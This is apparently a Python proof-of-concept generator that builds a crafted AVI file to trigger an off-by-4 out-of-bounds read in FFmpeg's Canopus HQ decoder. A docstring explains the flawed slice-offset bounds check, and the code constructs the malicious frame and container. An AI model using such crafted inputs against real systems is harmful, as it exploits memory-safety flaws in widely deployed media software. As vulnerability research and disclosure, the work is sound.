#!/usr/bin/env python3
"""
PoC generator for Off-by-4 OOB Read in HQ/HQA Slice Offset Bounds Check.

File: libavcodec/hq_hqa.c  Functions: hq_decode_frame() lines 176-184
CWE-125: Out-of-bounds Read

Root cause:
  In hq_hqa_decode_frame():
    data_size = bytestream2_get_bytes_left(gbc);   // includes the 4-byte tag
    tag       = bytestream2_get_le32u(gbc);         // consumes those 4 bytes
    hq_decode_frame(ctx, pic, gbc, tag>>24, data_size);  // passes ORIGINAL data_size

  In hq_decode_frame():
    src = gbc->buffer;                   // 4 bytes AFTER the start of data_size region
    ...
    // bounds check uses data_size that still counts the consumed tag:
    if (slice_off[slice+1] > data_size)  // BUG: should be > (data_size - 4)
    ...
    init_get_bits(&gb, src + slice_off[slice],
                  (slice_off[slice+1] - slice_off[slice]) * 8);
    // src + slice_off[slice+1] can be (avpkt->data + 4) + data_size
    //                                = avpkt->data + avpkt->size + 4  -- 4 bytes OOB

Trigger strategy (HQ path):
  Set last slice end offset = data_size.
  Check: data_size > data_size => FALSE => passes (BUG).
  Correct check: data_size > (data_size-4) => TRUE => should reject slice.
  init_get_bits receives a bit-buffer whose declared end is 4 bytes past packet end.
  Subsequent bit reads from near the slice end access OOB memory.

Note on ASAN / padding:
  FFmpeg av_new_packet() appends AV_INPUT_BUFFER_PADDING_SIZE (64) bytes of zeroes
  after avpkt->size, so the 4-byte OOB lands in that padding region and ASAN may
  not hard-crash.  The behavioral confirmation is that the "Invalid slice size"
  log line is NOT emitted (the check wrongly passes).
"""

import struct

OUTPUT_FILE = "vuln_001_input.avi"

# ── AVI building helpers ──────────────────────────────────────────────────────

def avi_chunk(fourcc: bytes, data: bytes) -> bytes:
    """fourcc(4) + size(4 LE) + data  (even-padded per AVI spec)."""
    assert len(fourcc) == 4
    padded = data + (b'\x00' if len(data) & 1 else b'')
    return fourcc + struct.pack('<I', len(data)) + padded


def avi_list(list_type: bytes, data: bytes) -> bytes:
    """LIST chunk: 'LIST' + size + list_type(4) + data."""
    assert len(list_type) == 4
    content = list_type + data
    return b'LIST' + struct.pack('<I', len(content)) + content


# ── HQ frame payload ──────────────────────────────────────────────────────────

PACKET_SIZE = 100   # avpkt->size; data_size will equal this value

def build_hq_frame() -> bytes:
    """
    Construct a crafted Canopus HQ frame that exercises the off-by-4 bug.

    Layout (PACKET_SIZE = 100 bytes):
      [0..3]   tag: 0x55 0x56 0x43 0x00   (LE u32 = 0x00435655)
               tag & 0x00FFFFFF = 0x00435655
               MKTAG('U','V','C',' ') & 0x00FFFFFF = 0x00435655  => HQ path
               tag >> 24 = 0 => hq_profile[0] = 160x120, 8 slices
      [4..30]  9 x 3-byte big-endian slice offsets (from 'UVC' position = byte 0)
               After subtracting 4 they become offsets from src (= byte 4)
      [31..99] zero-filled slice data (will cause VLC decode error, but that
               happens after the vulnerable bounds check passes)

    Off-by-4 trigger:
      stored slice_off[1] = 104  =>  slice_off[1] = 100 = data_size
      Bounds check: 100 > 100  => FALSE  (PASSES — this is the bug)
      Correct:      100 > 96   => TRUE   (should be REJECTED)
      init_get_bits buffer end = src + 100 = avpkt->data + 104  (4 bytes OOB)
    """
    # Tag bytes in memory (little-endian u32)
    tag = bytes([0x55, 0x56, 0x43, 0x00])   # 'U','V','C', prof=0

    data_size = PACKET_SIZE

    # 9 stored offsets (24-bit big-endian, measured from byte-0 of tag)
    # slice_off[i] = stored[i] - 4
    stored = [
        31,   # slice_off[0] = 27  (minimum: (num_slices+1)*3 = 9*3 = 27)
        104,  # slice_off[1] = 100 = data_size  <- OOB trigger
        104,  # slice_off[2] = 100  (equal to [1] => outer loop breaks on slice 1)
        104,  # [3..8] same
        104,
        104,
        104,
        104,
        104,
    ]
    off_bytes = b''.join(
        bytes([(v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF])
        for v in stored
    )
    assert len(off_bytes) == 27

    header = tag + off_bytes               # 4 + 27 = 31 bytes
    payload = header + b'\x00' * (PACKET_SIZE - len(header))
    assert len(payload) == PACKET_SIZE
    return payload


# ── AVI container ─────────────────────────────────────────────────────────────

def build_avi(frame_data: bytes) -> bytes:
    width, height = 160, 120
    fps = 30
    usec_per_frame = 1_000_000 // fps   # 33333

    # -- avih: AVIMAINHEADER (14 DWORDs = 56 bytes) --
    avih_data = struct.pack('<14I',
        usec_per_frame,   # dwMicroSecPerFrame
        0,                # dwMaxBytesPerSec
        0,                # dwPaddingGranularity
        0x10,             # dwFlags (AVIF_HASINDEX)
        1,                # dwTotalFrames
        0,                # dwInitialFrames
        1,                # dwStreams
        len(frame_data),  # dwSuggestedBufferSize
        width,            # dwWidth
        height,           # dwHeight
        0, 0, 0, 0,       # dwReserved[4]
    )
    assert len(avih_data) == 56

    # -- strh: AVISTREAMHEADER (56 bytes) --
    # Format: 4s 4s I H H  8I  4h
    #         fccType fccHandler dwFlags wPriority wLanguage
    #         dwInitialFrames dwScale dwRate dwStart dwLength
    #         dwSuggestedBufferSize dwQuality dwSampleSize
    #         rcFrame(left top right bottom)
    strh_data = struct.pack('<4s4sIHH8I4h',
        b'vids',          # fccType
        b'CUVC',          # fccHandler = Canopus HQ/HQA (riff.c line 447)
        0,                # dwFlags
        0,                # wPriority
        0,                # wLanguage
        0,                # dwInitialFrames
        1,                # dwScale
        fps,              # dwRate
        0,                # dwStart
        1,                # dwLength (1 frame)
        len(frame_data),  # dwSuggestedBufferSize
        0xFFFFFFFF,       # dwQuality
        0,                # dwSampleSize
        0, 0, width, height,  # rcFrame
    )
    assert len(strh_data) == 56

    # -- strf: BITMAPINFOHEADER (40 bytes) --
    # Format: I i i H H 4s I i i I I
    strf_data = struct.pack('<Iii HH 4s I ii II',
        40,               # biSize
        width,            # biWidth
        -height,          # biHeight (negative = top-down)
        1,                # biPlanes
        0,                # biBitCount
        b'CUVC',          # biCompression
        len(frame_data),  # biSizeImage
        0,                # biXPelsPerMeter
        0,                # biYPelsPerMeter
        0,                # biClrUsed
        0,                # biClrImportant
    )
    assert len(strf_data) == 40

    # -- strl LIST --
    strl = avi_list(b'strl',
                    avi_chunk(b'strh', strh_data) +
                    avi_chunk(b'strf', strf_data))

    # -- hdrl LIST --
    hdrl = avi_list(b'hdrl', avi_chunk(b'avih', avih_data) + strl)

    # -- movi LIST: one compressed video frame "00dc" --
    frame_chunk = avi_chunk(b'00dc', frame_data)
    movi = avi_list(b'movi', frame_chunk)

    # -- idx1 index chunk --
    # AVIINDEXENTRY: ckid(4) dwFlags(4) dwChunkOffset(4) dwChunkSize(4)
    # dwChunkOffset is relative to start of movi list data (after 'movi' tag)
    idx1 = avi_chunk(b'idx1',
        b'00dc' + struct.pack('<III', 0x10, 0, len(frame_data)))

    # -- RIFF AVI --
    body = hdrl + movi + idx1
    riff = b'RIFF' + struct.pack('<I', len(body) + 4) + b'AVI ' + body
    return riff


# ── Main ─────────────────────────────────────────────────────────────────────

if __name__ == '__main__':
    frame = build_hq_frame()
    print(f"[*] HQ frame: {len(frame)} bytes, data_size={len(frame)}")
    print(f"[*] slice_off[0]=27, slice_off[1]={len(frame)} (= data_size)")
    print(f"[*] Bounds check: {len(frame)} > {len(frame)} => FALSE (PASSES -- BUG!)")
    print(f"[*] Correct check: {len(frame)} > {len(frame)-4} => TRUE (should FAIL)")
    print(f"[*] init_get_bits buffer end = avpkt->data + 4 + {len(frame)}"
          f" = avpkt->data + {len(frame)+4}  (4 bytes OOB)")

    avi = build_avi(frame)
    with open(OUTPUT_FILE, 'wb') as f:
        f.write(avi)
    print(f"[*] Written {len(avi)} bytes to {OUTPUT_FILE}")
    print(f"[*] Key: 'Invalid slice size' should NOT appear in ffmpeg output")
